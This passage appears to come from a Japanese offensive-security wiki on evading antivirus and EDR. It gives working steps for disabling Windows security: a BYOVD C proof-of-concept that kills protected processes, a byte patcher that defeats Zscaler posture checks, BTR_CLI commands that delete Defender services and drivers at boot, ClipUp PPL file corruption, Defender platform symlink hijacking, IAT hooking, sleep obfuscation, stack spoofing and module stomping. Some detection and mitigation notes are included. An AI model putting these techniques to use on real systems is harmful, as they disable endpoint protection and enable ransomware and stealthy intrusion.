- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – Kernel Space から AV/EDR を停止する

Storm-2603 は、ランサムウェアを投下する前にエンドポイント保護を無効化するため、**Antivirus Terminator** として知られる小型のコンソールユーティリティを利用しました。このツールは**脆弱だが *署名済み* のドライバーを独自に持ち込み**、特権カーネル操作を実行するために悪用します。こうした操作は、Protected-Process-Light (PPL) AV サービスでも阻止できません。<sup>[[12]](#references)</sup>

要点
1. **署名済みドライバー**: ディスクに配置されるファイルは `ServiceMouse.sys` ですが、バイナリは Antiy Labs の「System In-Depth Analysis Toolkit」に含まれる、正規に署名されたドライバー `AToolsKrnl64.sys` です。このドライバーには有効な Microsoft 署名が付いているため、Driver-Signature-Enforcement (DSE) が有効でも読み込まれます。
2. **サービスのインストール**:
   ```powershell
   sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
   sc start  ServiceMouse
   ```
   最初の行は driver を **kernel service** として登録し、2行目はそれを起動します。これにより、`\\.\ServiceMouse` が user land からアクセス可能になります。
3. **driver が公開する IOCTL**
   | IOCTL code | Capability                              |
   |-----------:|-----------------------------------------|
   | `0x99000050` | PID を指定して任意の process を終了する（Defender/EDR service の停止に使用） |
   | `0x990000D0` | ディスク上の任意の file を削除する |
   | `0x990001D0` | driver をアンロードし、service を削除する |

   最小限の C proof-of-concept：
   ```c
   #include <windows.h>
   
   int main(int argc, char **argv){
       DWORD pid = strtoul(argv[1], NULL, 10);
       HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
       DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
       CloseHandle(hDrv);
       return 0;
   }
   ```
4. **動作する理由**: BYOVD はユーザーモードの保護を完全に迂回します。カーネルで実行されるコードは、PPL/PP、ELAM、その他のハードニング機能に関係なく、*保護された*プロセスを開いたり、終了させたり、カーネルオブジェクトを改ざんしたりできます。

検出 / 緩和策
•  Microsoft の脆弱なドライバーのブロックリスト（`HVCI`、`Smart App Control`）を有効にし、Windows が `AToolsKrnl64.sys` を読み込まないようにします。
•  新しい *カーネル* サービスの作成を監視し、ドライバーが誰でも書き込み可能なディレクトリから読み込まれた場合や、許可リストにない場合にアラートを発します。
•  ユーザーモードのハンドルがカスタムデバイスオブジェクトに対して作成された後、不審な `DeviceIoControl` 呼び出しが行われないか監視します。

### ディスク上のバイナリのパッチ適用による Zscaler Client Connector の Posture Check のバイパス

Zscaler の **Client Connector** は、デバイスの Posture ルールをローカルで適用し、結果を他のコンポーネントに伝えるために Windows RPC に依存しています。2 つの弱い設計上の選択により、完全なバイパスが可能です。

1. Posture の評価が **完全にクライアント側で行われる**（ブール値がサーバーに送信される）。
2. 内部 RPC エンドポイントは、接続元の実行ファイルが Zscaler によって署名されていること（`WinVerifyTrust` 経由）だけを検証する。<sup>[[11]](#references)</sup>

**ディスク上の署名済みバイナリ 4 つにパッチを適用**することで、両方の仕組みを無効化できます。

| Binary | パッチ適用対象の元のロジック | 結果 |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | 常に `1` を返すため、すべてのチェックが準拠状態になる |
| `ZSAService.exe` | `WinVerifyTrust` への間接呼び出し | NOP 化され、署名のないプロセスを含む任意のプロセスが RPC パイプに接続できる |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | `mov eax,1 ; ret` に置き換えられる |
| `ZSATunnel.exe` | トンネルの整合性チェック | 短絡される |

最小限のパッチャー抜粋:

```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
    data = f.read()
    off = data.find(pattern)
    if off == -1:
        print("pattern not found")
    else:
        f.seek(off)
        f.write(replacement)
```

After replacing the original files and restarting the service stack:

* **すべて**の posture checks が **green/compliant** と表示される。
* 署名されていない、または改変されたバイナリから、名前付きパイプの RPC エンドポイント（例: `\\RPC Control\\ZSATrayManager_talk_to_me`）を開ける。
* 侵害されたホストは、Zscaler policies で定義された内部ネットワークに無制限でアクセスできる。

このケーススタディは、クライアント側だけで行われる信頼判断と単純な署名チェックが、わずかなバイトパッチで回避できることを示している。

## Microsoft Defender `BTR.sys` の信頼された機能の悪用

Defender の **Boot-Time Removal** driver は、従来の BYOVD とは異なる好例だ。`BTR.sys` は、memory-corruption bug も IOCTL interface も持たない、正規の Microsoft 署名済み修復コンポーネントである。管理者アクセスと `SeLoadDriverPrivilege` を得た後、実行者は代わりにプライベートな修復トランザクションを偽造し、意図された Ring-0 の file/registry 操作を実行できる。これは **侵害後に AV/EDR を無力化するためのプリミティブであり、initial access や privilege escalation ではない**。また、目立つサードパーティ製 driver を持ち込むのではなく、標的自身の `MpEngine.dll` に含まれる `BOOTTIMETOOL` resource から driver を抽出できる。<sup>[[36]](#references)</sup>

### ワンショット driver のステージング

Defender は通常、この resource をランダムな `[a-z]{8}.sys` ファイルとして書き出し、同様の名前を持つ kernel service を登録する。`DriverEntry` はサービスの `Args` 値を読み取り、参照先の NTFS ADS を開いて action list を復号・検証し、feedback を書き込む。処理が正常に完了すると `0xC0000056` (`STATUS_DELETE_PENDING`) を返し、driver が常駐せずにアンロードされるようにする。偽造した service には、以下の特徴的な値がある。<sup>[[36]](#references)[[37]](#references)</sup>

```text
Type         = 1
Start        = 1
ErrorControl = 0
ImagePath    = \??\C:\Windows\System32\drivers\<random>.sys
Group        = Boot Bus Extender
Args         = C:\Windows\System32\drivers\<random>.sys:changelist
```

`:changelist` ストリームには、RC4で暗号化されたblobが1つ含まれています。解析対象のビルドでは固定の256バイトキーが再利用されるため、暗号化は認可の境界にはなりません。有効な平文は、24バイトのグローバルヘッダー（`Magic=0xFEE1DEAD`、`Version=2`、`PayloadOffset=0x10`、ヘッダーCRC、ペイロード由来のトランザクションID）に続き、ヌル終端UTF-16 feedback pathと任意個数のitemで構成されます。各itemは16バイトのヘッダー（`DataSize`、`Action`、`HeaderCRC`、`DataCRC`）と、そのaction固有のデータから成り、末尾は**正確に4バイトのNUL**で終わります。すべてのヘッダー領域とデータ領域は、CRC-32多項式`0xEDB88320`、初期状態`0xFFFFFFFF`、**final XORなし**（`~CRC32`）で個別に検証されます。領域ごとにCRC状態はリセットされます。<sup>[[36]](#references)[[37]](#references)</sup>

受け付けられるaction IDによって、以下のkernel primitivesが利用可能になります。<sup>[[36]](#references)[[37]](#references)</sup>

| ID | Item data | 結果 |
| --- | --- | --- |
| 1 | `[UTF-16 path]` | ロックされたファイルを含むファイルの削除 |
| 2 | `[UTF-16 path]` | 空のディレクトリの削除 |
| 3 | `[Flags][source][destination]` | 攻撃者が選択した保護対象パスへのファイル移動。destinationが空の場合は削除 |
| 4 | `[Flags][key path]` | レジストリキーの再帰的な削除 |
| 5 | `[Flags][key path + "\\" + value]` | レジストリ値の削除 |
| 6 | `[Flags][type][size][key path + "\\" + value][data]` | レジストリ値の作成・更新と、不足しているキー パスの作成 |

action 5と6では、wire上のkey/value区切り文字は**連続する2つのバックスラッシュ**です。一般的な形式のパスでは正しく分割されません。feedback fileはおおむねリクエストを反映しますが、各itemの先頭4バイトのデータは、処理結果の`NTSTATUS`になります。先頭にflagsフィールドを持たないaction 1と2では、BTRはステータス用の領域を確保するため、パスを末尾の予約済み4バイトに移動します。<sup>[[36]](#references)</sup>

### `BTR_CLI` workflowとearly-boot window

[`BTR_CLI`](https://github.com/Dump-GUY/BTR_CLI)は一連の処理を実装しています。ローカルのDefenderから`BTR.sys`を抽出し、`<random>.sys:changelist`とfeedback streamを作成して、連鎖するactionをシリアライズ、チェックサム計算、暗号化します。次にサービスのレジストリキーを直接作成し、`-trigger now`の場合は`NtLoadDriver`を呼び出します。`-trigger boot`の場合はsystem-start driverとして設定します。レジストリを直接ステージングすることで、通常のSCM `CreateServiceW`経路を回避するため、サービスインストールのEvent ID 7045は生成されません。boot-triggeredのartifactは、後から`BTR_CLI.exe -cleanup <service_name>`で削除できます。<sup>[[36]](#references)[[37]](#references)</sup>

```powershell
# Runtime: remove protected security-service registrations from Ring 0
BTR_CLI.exe -chain -item "4|HKLM\SYSTEM\CurrentControlSet\Services\WdFilter" -item "4|HKLM\SYSTEM\CurrentControlSet\Services\WinDefend" -trigger now

# Boot: delete a security driver before its user-mode protection stack starts
BTR_CLI.exe -a 1 -s "C:\Windows\System32\drivers\wd\WdFilter.sys" -trigger boot
```

`Start=0` は使用できません。BTR はストレージスタックと `SystemRoot` リンクの準備が整う前に、`DriverEntry` からファイル I/O を実行するためです。`Start=1` と高優先度の `Boot Bus Extender` グループを組み合わせると、Phase 1 で実行されます。この時点では NTFS は使用できますが、多くのシステム起動セキュリティドライバーとユーザーモードの EDR サービスはまだ初期化されていません。`WdFilter` などのブート起動フィルターはすでに読み込まれている可能性がありますが、BTR は次回起動前にそのバイナリやサービス構成を削除でき、SCM がサービス実行ファイルを起動する前に削除することもできます。BTR はブート起動時の評価後に実行され、有効な Microsoft 署名を持つため、ELAM ではこの隙間を埋められません。<sup>[[36]](#references)</sup>

複数のアクションは1つのトランザクションで実行されます。PoC は、ハードコードされた `\SystemRoot\Temp\BootClean.log` に対する Action 1 を先頭に追加します。BTR はこのログを作成した後、自身の削除要求を処理し、アンロード前にログを削除します。これにより証拠が減り、フィードバックを `<random>.sys:<random>.dat` に保存すれば、ドライバーと両方のストリームをまとめて削除できます。<sup>[[36]](#references)[[37]](#references)</sup>

### 重要度の高い検出相関

署名のみを使ったルールや Microsoft の脆弱なドライバーのブロックリストでは、BTR の本来の機能の悪用には対処できません。正規の Defender の系統と任意のランチャーを区別しながら、次のような振る舞いの相関を優先してください。<sup>[[36]](#references)</sup>

- **Sysmon 15:** `.sys:changelist` の作成は、BTR のステージングで常に発生します。同じ `.sys` に付加された `.dat` ADS は特に疑わしいものです。正規の Defender は通常、フィードバックを `C:\ProgramData\Microsoft\Windows Defender\Scans\RebootActions\` 以下に保存するためです。
- **System 7045 を伴わない Sysmon 12/13:** `Args=...:changelist` と `Group=Boot Bus Extender` を含む `HKLM\SYSTEM\CurrentControlSet\Services\<random>` の直接作成を、対応する SCM のインストールイベントがない場合に相関させます。
- **Sysmon 6 -> 23:** 既知の BTR ドライバーが Defender 以外の系統から読み込まれ、その後に `System`/PID 4 によるファイル削除が発生した場合、特にセキュリティ関連バイナリが対象なら相関させます。
- **Sysmon 11 -> 23:** `System`/PID 4 による `\SystemRoot\Temp\BootClean.log` の短時間での作成と削除を検知します。
- `SeLoadDriverPrivilege` の割り当てと有効化を制限し、監査します。`cmd.exe`、PowerShell、または不明なプロセスがセキュリティツールのドライバーをステージングしている場合、Microsoft 署名だけでは信頼の根拠として不十分です。

## LOLBINs を使って Protected Process Light (PPL) を悪用し、AV/EDR を改変する

Protected Process Light (PPL) は署名者と保護レベルの階層を適用し、同等以上の保護レベルを持つプロセスだけが互いに改変できるようにします。攻撃側の観点では、PPL 対応バイナリを正規の方法で起動し、その引数を制御できれば、ログ記録などの無害な機能を、AV/EDR が使用する保護ディレクトリに対する、制約付きの PPL ベースの書き込みプリミティブへと変換できます。<sup>[[16]](#references)[[17]](#references)[[18]](#references)[[19]](#references)[[20]](#references)</sup>

プロセスを PPL として実行するための条件
- 対象の EXE と、読み込まれる DLL はすべて、PPL 対応の EKU で署名されている必要があります。
- `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS` フラグを指定して、CreateProcess でプロセスを作成する必要があります。
- バイナリの署名者に一致する、互換性のある保護レベルを要求する必要があります（例: マルウェア対策署名者には `PROTECTION_LEVEL_ANTIMALWARE_LIGHT`、Windows 署名者には `PROTECTION_LEVEL_WINDOWS`）。誤ったレベルを指定すると、作成に失敗します。

PP/PPL と LSASS 保護の概要については、こちらも参照してください。

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

ランチャーツール
- オープンソースのヘルパー: CreateProcessAsPPL（保護レベルを選択し、引数を対象 EXE に渡します）:
  - [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)<sup>[[19]](#references)</sup>
- 使用パターン:

```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```

LOLBIN primitive: ClipUp.exe
- 署名済みシステムバイナリ `C:\Windows\System32\ClipUp.exe` は自分自身を起動し、呼び出し元が指定したパスにログファイルを書き込むパラメーターを受け付けます。
- PPL プロセスとして起動すると、PPL の権限でファイル書き込みが行われます。
- ClipUp はスペースを含むパスを解析できません。通常は保護されている場所を指定するには、8.3 短縮パスを使用します。

8.3 短縮パスの確認方法
- 短縮名を一覧表示: 各親ディレクトリで `dir /x` を実行します。
- cmd で短縮パスを取得: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

悪用チェーン（概要）
1) ランチャー（例: CreateProcessAsPPL）を使い、`CREATE_PROTECTED_PROCESS` を指定して PPL 対応の LOLBIN（ClipUp）を起動します。
2) ClipUp のログパス引数を渡し、保護された AV ディレクトリ（例: Defender Platform）にファイルを作成させます。必要に応じて 8.3 短縮名を使用します。
3) 対象バイナリが AV の実行中に通常ロックされている場合（例: MsMpEng.exe）、AV の起動前に書き込みが行われるよう、より早く確実に実行される自動起動サービスをインストールして、起動時に実行するよう設定します。Process Monitor（boot logging）で起動順序を確認します。
4) 再起動すると、AV がバイナリをロックする前に PPL の権限で書き込みが行われ、対象ファイルが破損して起動できなくなります。

実行例（安全のためパスは伏せ字／短縮済み）:

```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```

注意事項と制約
- 配置場所は制御できますが、ClipUp が書き込む内容は制御できません。このプリミティブは、正確な内容の注入ではなく破損に適しています。
- サービスのインストール／起動にはローカル管理者権限または SYSTEM 権限が必要で、再起動できる時間帯も必要です。
- タイミングが重要です。対象が開かれていてはいけません。起動時に実行することでファイルロックを回避できます。

検出
- 起動時付近に、特に標準外のランチャーを親プロセスとして、通常とは異なる引数で実行される `ClipUp.exe` のプロセス作成。
- 不審なバイナリを自動起動するよう設定された新規サービスや、Defender/AV より一貫して早く起動するサービス。Defender の起動失敗前に行われたサービスの作成／変更を調査してください。
- Defender のバイナリ／Platform ディレクトリに対するファイル整合性監視。保護プロセスフラグを持つプロセスによる予期しないファイルの作成／変更。
- ETW/EDR テレメトリ：`CREATE_PROTECTED_PROCESS` で作成されたプロセスや、AV 以外のバイナリによる異常な PPL レベルの使用を確認してください。

緩和策
- WDAC/Code Integrity：PPL として実行できる署名済みバイナリと、その親プロセスを制限し、正当なコンテキスト以外での ClipUp の起動をブロックしてください。
- サービスの適切な管理：自動起動サービスの作成／変更を制限し、起動順序の操作を監視してください。
- Defender の改ざん防止と早期起動時の保護が有効になっていることを確認してください。バイナリ破損を示す起動エラーを調査してください。
- 環境との互換性がある場合は、セキュリティツールを配置するボリュームでの 8.3 短縮名の生成を無効にすることを検討してください（十分にテストしてください）。

## Platform Version フォルダーのシンボリックリンク乗っ取りによる Microsoft Defender の改ざん

Windows Defender は、次の場所にあるサブフォルダーを列挙して、実行元のプラットフォームを選択します。
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

最も辞書順で大きいバージョン文字列を持つサブフォルダー（例：`4.18.25070.5-0`）を選択し、そこから Defender サービスプロセスを起動します（サービス／レジストリのパスもそれに合わせて更新されます）。この選択では、ディレクトリの再解析ポイント（シンボリックリンクを含む）も含め、ディレクトリエントリが信頼されます。管理者はこれを利用して Defender を攻撃者が書き込み可能なパスへリダイレクトし、DLL sideloading やサービス妨害を実現できます。<sup>[[21]](#references)[[22]](#references)</sup>

前提条件
- ローカル管理者権限（Platform フォルダー内にディレクトリ／シンボリックリンクを作成するために必要）
- 再起動、または Defender のプラットフォーム再選択をトリガーできること（起動時のサービス再起動）
- 必要なのは組み込みツールのみ（mklink）

仕組み
- Defender は自身のフォルダーへの書き込みをブロックしますが、プラットフォーム選択時にはディレクトリエントリを信頼し、リンク先が保護された／信頼済みのパスに解決されるか確認せずに、辞書順で最も大きいバージョンを選択します。

手順（例）
1) 現在のプラットフォームフォルダーの書き込み可能なコピーを `C:\TMP\AV` などに用意します。
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Platform 内に、自分のフォルダを指す上位バージョンのディレクトリ symlink を作成します:
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) トリガーの選択（再起動を推奨）:
```cmd
shutdown /r /t 0
```
4) MsMpEng.exe (WinDefend) がリダイレクト先のパスから実行されていることを確認します:
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
`C:\TMP\AV\` 配下の新しいプロセスパスと、その場所を反映したサービス設定/レジストリを確認してください。

Post-exploitation のオプション
- DLL sideloading/code execution: Defender がアプリケーションディレクトリから読み込む DLL を配置/置換し、Defender のプロセス内でコードを実行します。上記のセクションを参照してください: [DLL Sideloading & Proxying](#dll-sideloading--proxying)。
- Service kill/denial: バージョンシンボリックリンクを削除すると、次回起動時に設定済みのパスが解決できず、Defender の起動に失敗します:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```

> [!TIP]
> この手法だけでは権限昇格できない点に注意してください。管理者権限が必要です。

## API/IAT Hooking + Call-Stack Spoofing with PIC (Crystal Kit-style)

Red teamは、Import Address Table（IAT）をフックし、選択したAPIを攻撃者が制御する位置独立コード（PIC）経由で実行することで、ランタイム回避処理をC2 implantからターゲットモジュール自体へ移せます。これにより、多くのkitが公開する限られたAPI（例: CreateProcessA）に依存せず、回避処理を拡張できます。また、同じ保護をBOFsやpost-exploitation DLLにも適用できます。<sup>[[3]](#references)[[4]](#references)[[5]](#references)</sup>

高レベルの手順
- reflective loaderを使って、ターゲットモジュールとともにPIC blobを配置します（先頭に付加するか、同伴させます）。PICは自己完結型で、位置独立である必要があります。
- ホストDLLのロード時にIMAGE_IMPORT_DESCRIPTORを走査し、対象のimport（例: CreateProcessA/W、CreateThread、LoadLibraryA/W、VirtualAlloc）に対応するIATエントリを、薄いPIC wrapperを指すように書き換えます。
- 各PIC wrapperは、実際のAPIアドレスをtail-callする前に回避処理を実行します。一般的な回避処理には次のものがあります。
  - 呼び出しの前後でメモリのmask/unmaskを行う（例: beacon領域の暗号化、RWX→RX、ページ名やアクセス許可の変更後に復元）。
  - Call-stack spoofing: 正常に見えるstackを構築し、ターゲットAPIへ遷移することで、call-stack解析時に想定されたframeとして解決されるようにします。<sup>[[9]](#references)</sup>
- 互換性のため、Aggressor script（または同等のもの）がBeacon、BOFs、post-ex DLL向けにフックするAPIを登録できるinterfaceをexportします。

ここでIAT hookingを使う理由
- フック対象のimportを使うコードなら、toolのコードを変更したり、Beaconに特定のAPIをproxyさせたりせずに機能します。
- post-ex DLLにも対応します。LoadLibrary*をフックすれば、モジュールのロード（例: System.Management.Automation.dll、clr.dll）を傍受し、それらのAPI呼び出しにも同じmasking/stack回避を適用できます。
- CreateProcessA/Wをwrapperで包むことで、call-stackベースの検知に対して、プロセスを生成するpost-exコマンドを安定して使用できます。

最小限のIAT hookの概要（x64 C/C++ pseudocode）
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
Notes
- relocations/ASLR 後、import の初回使用前にパッチを適用します。TitanLdr/AceLdr のような Reflective loader は、ロードされたモジュールの DllMain 内での hook を実証しています。
- wrapper は小さく、PIC-safe に保ちます。パッチ適用前に取得した元の IAT 値、または LdrGetProcedureAddress を使って本来の API を解決します。
- PIC では RW → RX の遷移を使い、書き込み可能かつ実行可能なページを残さないようにします。

Call-stack spoofing stub
- Draugr 形式の PIC stub は、偽の call chain（良性モジュール内の return address）を構築してから、実際の API に処理を移します。
- これにより、Beacon/BOFs から機密 API への正規の stack を想定する検出を回避できます。
- stack cutting/stack stitching 技法と組み合わせ、API prologue の前に想定される frame 内へ処理を移します。

Operational integration
- reflective loader を post-ex DLL の先頭に追加し、DLL のロード時に PIC と hook が自動的に初期化されるようにします。
- Aggressor script で対象 API を登録すると、コードを変更せずに Beacon と BOFs が同じ evasion path を透過的に利用できます。

Detection/DFIR considerations
- IAT integrity: non-image（heap/anon）アドレスを指すエントリ、import pointer の定期的な検証。
- Stack anomalies: ロード済み image に属さない return address、non-image PIC への急な遷移、整合しない RtlUserThreadStart の祖先関係。
- Loader telemetry: プロセス内での IAT 書き込み、import thunk を変更する DllMain の早期動作、ロード時に作成される予期しない RX 領域。
- Image-load evasion: LoadLibrary* を hook する場合、メモリマスキングイベントと相関する automation/clr assembly の不審なロードを監視します。

Related building blocks and examples
- ロード時に IAT patching を行う Reflective loader（例: TitanLdr、AceLdr）
- Memory masking hooks（例: simplehook）と stack-cutting PIC（stackcutting）
- PIC call-stack spoofing stub（例: Draugr）


## Import-Time IAT Hooking + Sleep Obfuscation (Crystal Palace/PICO)

### resident PICO を介した import-time IAT hooks

reflective loader を制御できる場合、カスタム resolver で loader の `GetProcAddress` pointer を置き換えることで、`ProcessImports()` **中に** import を hook できます:<sup>[[6]](#references)[[7]](#references)[[8]](#references)</sup>

- transient loader PIC が自身を解放した後も存続する **resident PICO**（persistent PIC object）を作成します。
- `setup_hooks()` 関数を export し、loader の import resolver を上書きします（例: `funcs.GetProcAddress = _GetProcAddress`）。
- `_GetProcAddress` では ordinal import をスキップし、`__resolve_hook(ror13hash(name))` のような hash-based hook lookup を使います。hook があればそれを返し、なければ本物の `GetProcAddress` に処理を委譲します。
- Crystal Palace の `addhook "MODULE$Func" "hook"` エントリを使い、link time に hook target を登録します。hook は resident PICO 内にあるため有効なままです。

これにより、ロード後に DLL の code section を patch せずに **import-time IAT redirection** が可能になります。

### 対象が PEB-walking を使う場合に hook 可能な import を強制する

import-time hook が動作するのは、その関数が対象の IAT に実際に存在する場合だけです。モジュールが PEB-walk + hash で API を解決し（import entry がない場合）、loader の `ProcessImports()` 経路に認識させるには、実際の import を強制します。

- hashed export resolution（例: `GetSymbolAddress(..., HASH_FUNC_WAIT_FOR_SINGLE_OBJECT)`）を、`&WaitForSingleObject` のような直接参照に置き換えます。
- コンパイラが IAT entry を生成するため、reflective loader が import を解決する際に interception できるようになります。

### `Sleep()` を patch しない Ekko-style sleep/idle obfuscation

`Sleep` を patch する代わりに、implant が実際に使う **wait/IPC primitive**（`WaitForSingleObject(Ex)`、`WaitForMultipleObjects`、`ConnectNamedPipe`）を hook します。長時間の wait では、Ekko-style obfuscation chain で idle 中にメモリ上の image を暗号化します:<sup>[[31]](#references)[[27]](#references)</sup>

- `CreateTimerQueueTimer` を使って callback のシーケンスをスケジュールし、細工した `CONTEXT` frame で `NtContinue` を呼び出します。
- 一般的な chain（x64）: image を `PAGE_READWRITE` に設定 → `advapi32!SystemFunction032` で map 済み image 全体を RC4 暗号化 → blocking wait を実行 → RC4 復号 → PE section を走査して **section ごとの権限を復元** → 完了を通知。
- `RtlCaptureContext` から template `CONTEXT` を取得し、複数の frame に clone して、各手順を呼び出すよう register（`Rip/Rcx/Rdx/R8/R9`）を設定します。

運用上の詳細: 長時間の wait（例: `WAIT_OBJECT_0`）では「success」を返し、image がマスクされている間に caller が処理を続けられるようにします。このパターンは idle window 中に scanner から module を隠し、従来の「patch された `Sleep()`」の signature を避けます。

Detection ideas (telemetry-based)
- `NtContinue` を指す `CreateTimerQueueTimer` callback の集中発生。
- 大きく連続した image サイズの buffer に対する `advapi32!SystemFunction032` の使用。
- 大きな範囲に対する `VirtualProtect` の後、section ごとの権限を独自に復元する動作。

### sleep-obfuscation gadget の runtime CFG registration

CFG が有効な対象では、`jmp [rbx]` や `jmp rdi` のような function 中間 gadget への最初の indirect jump で、gadget がモジュールの CFG metadata に存在しないため、通常は `STATUS_STACK_BUFFER_OVERRUN` が発生してプロセスが crash します。hardening されたプロセス内で Ekko/Kraken-style chain を動作させるには:<sup>[[30]](#references)</sup>

- chain が使う indirect destination をすべて、`CFG_CALL_TARGET_VALID` entry を使って `NtSetInformationVirtualMemory(..., VmCfgCallTargetInformation, ...)` に登録します。
- ロード済み image（`ntdll`、`kernel32`、`advapi32`）内のアドレスでは、`MEMORY_RANGE_ENTRY` は **image base** から始まり、**image 全体のサイズ**をカバーする必要があります。
- 手動 map/PIC/stomp された領域では、代わりに **allocation base** と allocation size を使います。
- dispatch gadget だけでなく、間接的に到達する export（`NtContinue`、`SystemFunction032`、`VirtualProtect`、`GetThreadContext`、`SetThreadContext`、wait/event syscall）や、indirect target となる attacker-controlled executable section も登録します。

これにより、ROP/JOP-style sleep chain を「CFG が無効なプロセスでのみ動作」するものから、`/guard:cf` でコンパイルされた `explorer.exe`、browser、`svchost.exe`、その他の endpoint でも再利用可能な primitive にできます。

### sleeping thread の CET-safe stack spoofing

`CONTEXT` 全体の置き換えは目立ちやすく、CET Shadow Stack システムでは spoof された `Rip` が hardware shadow stack と一致する必要があるため、問題を起こすことがあります。より安全な sleep-masking パターンは次のとおりです:<sup>[[30]](#references)</sup>

- 同じプロセス内の別 thread を選び、`NtQueryInformationThread` で `NT_TIB` / TEB の stack bounds（`StackBase`、`StackLimit`）を読み取ります。
- 現在の thread の実際の TEB/TIB をバックアップします。
- `GetThreadContext` で実際の sleep 中の context を取得します。
- spoof context には実際の `Rip` **のみ**をコピーし、spoof された `Rsp`/stack state はそのままにします。
- sleep window 中、spoof thread の `NT_TIB` を現在の TEB にコピーし、stack walker が正規の stack 範囲内で unwind するようにします。
- wait の完了後、元の TIB と thread context を復元します。

これにより CET と整合する instruction pointer を保ちつつ、TEB の stack metadata を信頼して unwind を検証する EDR stack walker を欺けます。

### APC-based alternative: Kraken Mask

timer-queue dispatch の signature が強すぎる場合、同じ sleep-encrypt-spoof-restore sequence を、suspended helper thread 上で queued APC を使って実行できます:<sup>[[27]](#references)</sup>

- entrypoint を `NtTestAlert` にして helper thread を作成します。
- `NtQueueApcThread` で準備済みの `CONTEXT` frame/APC を queue し、`NtAlertResumeThread` で処理します。
- default の 64 KB thread stack を使い切らないよう、chain state は helper stack ではなく heap に保存します。
- `NtSignalAndWaitForSingleObject` を使い、start event の通知と block を原子的に行います。
- TIB/context を復元する前に main thread を suspend し（`NtSuspendThread` → restore → `NtResumeThread`）、scanner が復元途中の stack を捕捉する race window を小さくします。

これにより、同じ RC4 masking と stack-spoofing の目標を維持しつつ、`CreateTimerQueueTimer` + `NtContinue` の signature を helper-thread/APC の signature に置き換えます。

Additional detection ideas
- sleep、wait、APC dispatch の直前に行われる `VmCfgCallTargetInformation` を指定した `NtSetInformationVirtualMemory`。
- `WaitForSingleObject(Ex)`、`NtWaitForSingleObject`、`NtSignalAndWaitForSingleObject`、`ConnectNamedPipe` の前後で実行される `GetThreadContext`/`SetThreadContext`。
- `NtQueryInformationThread` の後、現在の thread の TEB/TIB stack bounds に直接書き込む動作。
- 間接的に `SystemFunction032`、`VirtualProtect`、または section-permission restoration helper に到達する `NtQueueApcThread`/`NtAlertResumeThread` chain。
- 署名済み module 内の dispatch pivot として、`FF 23`（`jmp [rbx]`）や `FF E7`（`jmp rdi`）のような短い gadget signature を繰り返し使用する動作。


## Precision Module Stomping

Module stomping は、明らかな private executable memory を割り当てたり、新しい sacrificial DLL をロードしたりする代わりに、対象プロセス内ですでに map されている DLL の **`.text` section** から payload を実行します。overwrite の対象には、プロセスが引き続き必要とする code path を破損させずに payload を収容できる **ロード済みの disk-backed image** を選びます。<sup>[[1]](#references)[[2]](#references)</sup>

### 信頼性の高い対象選定

`uxtheme.dll` や `comctl32.dll` など一般的な module に対する安易な stomping は不安定です。DLL がリモートプロセスにロードされていない場合があり、code region が小さすぎるとプロセスが crash します。より信頼性の高い手順は次のとおりです。

1. 対象プロセスの module を列挙し、すでにロードされている DLL の **名前のみの include list** を作成します。
2. まず payload をビルドし、**正確な byte size** を記録します。
3. ディスク上の候補 DLL を調べ、PE section の **`.text` `Misc_VirtualSize`** と payload size を比較します。これはメモリに map された**実行可能 section のサイズ**を示すため、file size より重要です。
4. **Export Address Table (EAT)** を解析し、stomp 開始 offset として export 関数の RVA を選びます。
5. **blast radius** を計算します。payload が選択した関数の境界を超える場合、メモリ上で後続する隣接 export も上書きします。

実際に使われている一般的な recon/選定 helper:

```cmd
list-process-dlls.exe -p <PID> -n -o c:\payloads\modules.txt
python find-stompable-dlls.py -d c:\Windows\System32 -i c:\payloads\modules.txt <payload_size>
python dump-exports.py -f <dll_path>
python blast-radius.py -f <dll_path> -fnc <export_name> -s <payload_size>
```

運用上の注意
- `LoadLibrary` や予期しない image load の telemetry を避けるため、リモートプロセスですでに **ロード済み** の DLL を優先する。
- 対象アプリケーションでほとんど実行されない export を優先する。そうしないと、スレッド作成の前後に通常のコードパスが stomp されたバイト列に到達する可能性がある。
